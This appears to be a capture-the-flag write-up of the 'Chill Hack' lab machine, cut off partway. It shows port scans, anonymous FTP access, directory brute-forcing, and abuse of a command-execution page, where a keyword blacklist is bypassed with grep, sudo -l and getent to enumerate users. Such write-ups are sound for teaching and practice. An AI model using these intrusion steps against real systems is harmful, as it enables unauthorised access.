# Chill Hack
### 

Target machine IP: 10.80.129.48<br>
Attack machine IP: 192.168.136.34

Like always, contents of snippets is cut down for brevity. Shown content is not modified.
```
└─# nmap -sS 10.80.129.48 -p- -vv -n
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 62
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

```
└─# nmap -sC -sV -O 10.80.129.48 -p21,22,80 -vv -n
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Game Info
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
```

```
└─# ftp 10.80.129.48 21
Connected to 10.80.129.48.
220 (vsFTPd 3.0.5)
Name (10.80.129.48:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.

ftp> ls
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> 
```

```
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||65000|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |**********************************************************************************|    90        0.80 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.59 KiB/s)
ftp> exit
221 Goodbye.
```

```
└─$ cat note.txt    
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

```
└─$ gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url 10.80.129.48 -x php,html,txt
...
secret               (Status: 301) [Size: 313] [--> http://10.80.129.48/secret/]
```

We can execute commands here!
I tried executing `ls` but it returns 'Alert Are you a hacker?'. So it's blocked. `whoami` works, however.

```
command: whoami
response: www-data
```
Next I went for `sudo -l`. An interesting response was returned:
```
command: sudo -l
response: Matching Defaults entries for www-data on ip-10-80-129-48: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ip-10-80-129-48: (apaar : ALL) NOPASSWD: /home/apaar/.helpline.s
```
So there's a user named `apaar`

Since `cat`, `ls` and `less` commands are blocked ("Are you a hacker" is returned) I went for the unconventional way: let's use grep!
```
command: grep
response: 
index.php: background-image: url('images/FailingMiserableEwe-size_restricted.gif');
index.php: background-image: url('images/blue_boy_typing_nothought.gif'); 
```
Okay, so that are the gifs that play in the background. Now we know for sure that we're dealing with a .php file.


>PS: Directory/Path Traversal doesn't work :'(

Half an hour later... 

Commands for reverse shell do not work: `nc`, `python`, `php`, etc..<br>
So I thought of ways to enumerate system users:
```
command: getent group
response (partial):
aurick:x:1000:
apaar:x:1001:
anurodh:x:1002
```
So we've enumerated the users.
Maybe one of them has a weak password?
